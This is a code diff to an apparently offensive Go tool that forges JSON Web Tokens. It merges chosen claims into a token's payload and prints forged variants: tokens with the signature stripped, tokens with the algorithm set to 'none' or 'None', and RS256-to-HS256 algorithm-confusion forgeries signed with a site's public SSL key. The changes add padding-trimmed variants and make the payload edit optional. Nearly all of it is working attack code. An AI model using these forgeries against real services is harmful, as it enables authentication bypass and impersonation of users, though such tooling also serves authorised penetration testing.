@@ -26,14 +26,14 @@ type Header struct {
 
 func main() {
 
-	var domain, jsonStr, jwt string
+	var domain, jsonNewPayload, jwt string
 	flag.StringVar(&jwt, "t", "", "JWT Token to modify")
 	flag.StringVar(&domain, "d", "", "Domain to use the SSL public key for RS")
-	flag.StringVar(&jsonStr, "j", "{}", "json to merge with orginal payload")
+	flag.StringVar(&jsonNewPayload, "j", "", "json to merge with orginal payload")
 
 	flag.Parse()
 
-	fmt.Printf("\n\nAnalyzing                              %s\n\n", jwt)
+	fmt.Printf("\nAnalyzing                              %s\n\n", jwt)
 
 	jwtArr := strings.Split(jwt, ".")
 	encHeader := jwtArr[0]
@@ -45,13 +45,14 @@ func main() {
 	fmt.Printf("Current Payload                        %s\n\n", payload)
 
 	// Calculate new payload if any.
-	newPayload := getNewPayload(payload, jsonStr)
-
-	fmt.Printf("New Payload                            %s\n\n", newPayload)
+	if jsonNewPayload != "" {
+		payload = getNewPayload(payload, jsonNewPayload)
+		fmt.Printf("New Payload                            %s\n\n", payload)
+	}
 
 	// Forward new b64encoded payload.
-	encNewPayload := b64Encode([]byte(newPayload))
-	jwtWithoutSignature(encHeader, encNewPayload)
+	encNewPayload := b64Encode([]byte(payload))
+	jwtWithoutSignature(encHeader, encPayload)
 
 	jwtWithoutSignatureAndNewAlg(strHeader, encNewPayload, "none")
 	jwtWithoutSignatureAndNewAlg(strHeader, encNewPayload, "None")
@@ -133,9 +134,9 @@ func RS256ToHS256(encHeader string, encPayload string, domain string) {
 	header.Alg = "HS256"
 	newHeader, _ := json.Marshal(header)
 	fmt.Printf("JWT RS256 to HS256:                    %s.%s.%s\n\n", b64Encode(newHeader), encPayload, signature)
-	fmt.Printf("JWT RS256 to HS256, RM Padding:        %s.%s.%s\n\n", strings.Trim(b64Encode(newHeader), "="), strings.Trim(encPayload, "="), signature)
+	fmt.Printf("JWT RS256 to HS256, RM Padding:        %s.%s.%s\n\n", strings.Trim(b64Encode(newHeader), "="), strings.Trim(encPayload, "="), strings.Trim(signature, "="))
 	fmt.Printf("JWT RS256 to HS256 (B64):              %s.%s.%s\n\n", b64Encode(newHeader), encPayload, b64Encode([]byte(signature)))
-	fmt.Printf("JWT RS256 to HS256 (B64), RM Padding:  %s.%s.%s\n\n", strings.Trim(b64Encode(newHeader), "="), strings.Trim(encPayload, "="), b64Encode([]byte(signature)))
+	fmt.Printf("JWT RS256 to HS256 (B64), RM Padding:  %s.%s.%s\n\n", strings.Trim(b64Encode(newHeader), "="), strings.Trim(encPayload, "="), strings.Trim(b64Encode([]byte(signature)), "="))
 
 	// Remove certificate file..
 	os.Remove(certKeyFile)
